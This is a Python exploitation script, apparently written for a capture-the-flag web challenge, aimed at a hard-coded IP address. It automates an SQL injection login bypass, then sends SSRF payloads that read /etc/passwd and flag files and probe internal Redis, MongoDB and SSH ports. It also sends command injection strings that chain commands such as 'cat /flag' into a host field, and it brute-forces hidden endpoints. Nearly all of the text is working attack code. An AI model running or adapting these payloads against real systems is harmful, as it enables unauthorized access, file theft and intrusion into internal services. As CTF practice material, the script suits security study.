import requests
import re

def main():
    base_url = "http://18.212.136.134:9080"
    session = requests.Session()
    
    print("🚀 Comprehensive CTF Exploitation Script")
    print("=" * 60)
    
    # Step 1: Login with SQL Injection
    print("\n[1] LOGGING IN WITH SQL INJECTION...")
    payload = {"username": "admin' OR '1'='1'--", "password": "anything"}
    login_response = session.post(f"{base_url}/login", data=payload, allow_redirects=False)
    
    if login_response.status_code == 302:
        print("✅ SQL Injection successful! Session established.")
        print(f"Session cookie: {session.cookies.get_dict()}")
    else:
        print("❌ SQL Injection failed")
        return
    
    # Step 2: Access Dashboard
    print("\n[2] ACCESSING DASHBOARD...")
    dashboard_response = session.get(f"{base_url}/dashboard")
    if dashboard_response.status_code == 200:
        print("✅ Dashboard accessed successfully")
        
        # Look for flag in dashboard
        flags = re.findall(r'PCTF\{[^}]+\}', dashboard_response.text)
        if flags:
            print(f"🎯 FLAG FOUND IN DASHBOARD: {flags[0]}")
            return flags[0]
        
        # Check for connectivity tool link
        if "/connect" in dashboard_response.text:
            print("✅ Connectivity tool found: /connect")
    else:
        print("❌ Failed to access dashboard")
        return
    
    # Step 3: Access Connectivity Tool
    print("\n[3] ACCESSING CONNECTIVITY TOOL...")
    connect_response = session.get(f"{base_url}/connect")
    if connect_response.status_code == 200:
        print("✅ Connectivity tool accessed")
        
        # Save for analysis
        with open("connect_tool.html", "w") as f:
            f.write(connect_response.text)
        
        # Extract form details
        form_match = re.search(r'<form[^>]*>(.*?)</form>', connect_response.text, re.DOTALL)
        if form_match:
            print("✅ Form found in connectivity tool")
            
            # Find input fields
            inputs = re.findall(r'<input[^>]*name=[\"\']([^\"\']*)[\"\'][^>]*>', form_match.group(0))
            textareas = re.findall(r'<textarea[^>]*name=[\"\']([^\"\']*)[\"\'][^>]*>', form_match.group(0))
            
            all_params = inputs + textareas
            if all_params:
                print(f"✅ Form parameters found: {all_params}")
            else:
                print("⚠️ No form parameters found, using common ones")
                all_params = ["url", "host", "target", "address", "input"]
        else:
            print("⚠️ No form found, using common parameters")
            all_params = ["url", "host", "target", "address", "input"]
    else:
        print("❌ Failed to access connectivity tool")
        return
    
    # Step 4: Test SSRF Vulnerabilities
    print("\n[4] TESTING SSRF VULNERABILITIES...")
    print("-" * 40)
    
    ssrf_payloads = [
        # File access
        "file:///etc/passwd",
        "file:///flag",
        "file:///flag.txt", 
        "file:///app/flag",
        "file:///home/flag",
        "file:///var/www/flag",
        
        # Internal HTTP
        "http://localhost/flag",
        "http://127.0.0.1/flag",
        "http://localhost:8080/flag",
        "http://127.0.0.1:8080/flag",
        "http://localhost:9080/flag",
        "http://127.0.0.1:9080/flag",
        
        # The app itself
        "http://localhost:9080/",
        "http://127.0.0.1:9080/dashboard",
        
        # Internal services
        "http://localhost:22",
        "http://127.0.0.1:6379",
        "http://localhost:27017",
    ]
    
    for param in all_params:
        for payload in ssrf_payloads:
            test_data = {param: payload}
            print(f"Testing: {param} = {payload[:50]}...")
            
            try:
                response = session.post(f"{base_url}/connect", data=test_data, timeout=10)
                
                if response.status_code == 200:
                    # Check for flag
                    flags = re.findall(r'PCTF\{[^}]+\}', response.text)
                    if flags:
                        print(f"🎯 FLAG FOUND: {flags[0]}")
                        return flags[0]
                    
                    # Check for interesting content
                    if "root:" in response.text:
                        print(f"✅ File access successful with {param}!")
                        print(f"First line: {response.text.split(chr(10))[0]}")
                    
                    if "flag" in response.text.lower() and len(response.text) < 1000:
                        print(f"⚠️ Flag reference found with {param}")
                        print(f"Response: {response.text}")
                
            except Exception as e:
                print(f"Error with {param}={payload[:30]}: {e}")
    
    # Step 5: Test Command Injection
    print("\n[5] TESTING COMMAND INJECTION...")
    print("-" * 40)
    
    cmd_payloads = [
        "google.com; cat /flag",
        "google.com && cat /flag", 
        "google.com | cat /flag",
        "127.0.0.1; ls -la /",
        "localhost && cat /etc/passwd",
        "google.com || cat /flag.txt",
        "$(cat /flag)",
        "`cat /flag`",
        "google.com ; curl http://localhost:9080/flag",
        "; echo 'START'; cat /flag; echo 'END'",
    ]
    
    for param in all_params:
        for cmd in cmd_payloads:
            test_data = {param: cmd}
            print(f"Testing command injection: {param} = {cmd[:40]}...")
            
            try:
                response = session.post(f"{base_url}/connect", data=test_data, timeout=10)
                
                if response.status_code == 200:
                    # Look for command output patterns
                    if "PCTF{" in response.text:
                        flags = re.findall(r'PCTF\{[^}]+\}', response.text)
                        if flags:
                            print(f"🎯 FLAG FOUND: {flags[0]}")
                            return flags[0]
                    
                    if "START" in response.text and "END" in response.text:
                        print(f"✅ Command injection successful with {param}!")
                        between = response.text.split("START")[1].split("END")[0]
                        print(f"Command output: {between}")
                        
                        flags = re.findall(r'PCTF\{[^}]+\}', between)
                        if flags:
                            print(f"🎯 FLAG FOUND: {flags[0]}")
                            return flags[0]
                    
                    # Check for directory listing or file content
                    if "bin\nboot\ndev\netc\nhome" in response.text or "root:" in response.text:
                        print(f"✅ Command injection worked with {param}!")
                        print(f"First 200 chars: {response.text[:200]}")
                        
            except Exception as e:
                print(f"Error with command injection: {e}")
    
    # Step 6: Test Other Endpoints
    print("\n[6] TESTING OTHER ENDPOINTS...")
    print("-" * 40)
    
    endpoints = [
        "/flag", "/flag.txt", "/api/flag", "/getflag",
        "/admin/flag", "/debug/flag", "/secret/flag",
        "/api", "/api/data", "/api/users", "/api/config",
        "/data", "/users", "/config", "/export", "/backup"
    ]
    
    for endpoint in endpoints:
        try:
            response = session.get(f"{base_url}{endpoint}")
            if response.status_code == 200:
                print(f"[200] {endpoint}")
                
                flags = re.findall(r'PCTF\{[^}]+\}', response.text)
                if flags:
                    print(f"🎯 FLAG FOUND: {flags[0]}")
                    return flags[0]
                
                if len(response.text) < 1000:
                    print(f"Content: {response.text[:200]}...")
                    
        except Exception as e:
            print(f"Error accessing {endpoint}: {e}")
    
    print("\n❌ Flag not found with automated tests.")
    print("💡 Check the connectivity tool responses manually.")
    return None

if __name__ == "__main__":
    flag = main()
    if flag:
        print(f"\n{'='*60}")
        print(f"🎉 SUCCESS! FLAG: {flag}")
        print(f"{'='*60}")
    else:
        print(f"\n{'='*60}")
        print("🔍 Flag not found. Manual investigation needed.")
        print(f"{'='*60}")